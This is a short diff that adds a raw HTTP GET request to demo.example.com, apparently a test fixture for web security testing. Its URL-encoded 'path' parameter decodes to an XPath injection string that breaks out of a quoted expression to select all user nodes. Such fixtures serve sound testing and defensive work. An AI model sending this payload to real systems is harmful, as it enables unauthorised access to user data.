@@ -1,0 +1,4 @@
+GET /a?path=%27%5D%7C%2F%2F%75%73%65%72%5B%27 HTTP/1.1
+Host: demo.example.com
+Connection: close
+
